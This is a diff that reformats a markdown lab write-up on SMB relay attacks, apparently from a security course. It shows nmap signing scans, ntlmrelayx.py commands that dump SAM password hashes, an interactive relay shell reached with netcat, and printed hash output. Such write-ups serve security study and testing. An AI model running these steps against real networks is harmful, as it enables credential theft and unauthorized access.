@@ -3,9 +3,12 @@
 ## What is SMB Relay
 
 ![image](https://user-images.githubusercontent.com/96747355/167957290-5eee0e72-c551-41a6-b4e8-1576692615b9.png)  
-*Source: TCM Security Academy*  
+
+> *Source: TCM Security Academy*  
+
 ![image](https://user-images.githubusercontent.com/96747355/167957396-3dba4765-9007-4fe3-989c-cefc2422e5e4.png)  
-*Source: TCM Security Academy*  
+
+> *Source: TCM Security Academy*  
 
 ## Discovering hosts
 
@@ -13,7 +16,8 @@
 - With [Nmap](https://nmap.org/)
 ```nmap --script=smb2-security-mode.nse -p445 10.0.2.0/24```
 Example of what we get with this scan:
-```
+
+```bash
 ┌──(root💀kali)-[/home/kali]
 └─# nmap --script=smb2-security-mode.nse -p445 10.0.2.0/24    
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-29 16:36 EST
@@ -59,6 +63,7 @@ Host script results:
 
 Nmap done: 256 IP addresses (5 hosts up) scanned in 28.67 seconds
 ```
+
 The domain controller has `enable` and `required`, we wont relay on this machine.
 
 ## SMB Relay Attack
@@ -71,7 +76,8 @@ The domain controller has `enable` and `required`, we wont relay on this machine
 - Launch ntlmrelayx.py (our target ips are in targets.txt)
 ```ntlmrelayx.py -tf targets.txt -smb2support```
 - We should get som hashes on our kali
-```
+
+```bash
 [*] Done dumping SAM hashes for host: 10.0.2.4
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
@@ -85,7 +91,8 @@ Jessica Jones:1001:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391
 ```ntlmrelayx.py -tf targets.txt -smb2support -i```
 
 - It should work and mention that we got a shell
-```
+
+```bash
 [*] Servers started, waiting for connections
 [*] SMBD-Thread-3: Received connection from 10.0.2.15, attacking target smb://10.0.2.4
 [*] Authenticating against smb://10.0.2.4 as MARVEL\fcastle SUCCEED
@@ -96,7 +103,8 @@ Jessica Jones:1001:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391
 - We can netcat to get the shell:
 ```nc 127.0.0.1 11000```
 - We have an smb shell:
-```
+
+```bash
 └─# nc 127.0.0.1 11000                                        
 Type help for list of commands
 # help
@@ -147,9 +155,11 @@ drw-rw-rw-          0  Fri Jan 28 19:28:21 2022 Users
 drw-rw-rw-          0  Fri Jan 28 17:23:30 2022 Windows
 #
 ```
-*Note: ntlmrelayx.py is really powerfull and has many commands, we could even launch other shells.*
+
+> *Note: ntlmrelayx.py is really powerfull and has many commands, we could even launch other shells.*
 
 ## SMB Relay attack Defenses
 
 ![image](https://user-images.githubusercontent.com/96747355/167957563-c1a2d775-3c4a-4aec-94ac-08dc5d0c505d.png)  
-*Source: TCM Security Academy*  
+
+> *Source: TCM Security Academy*  
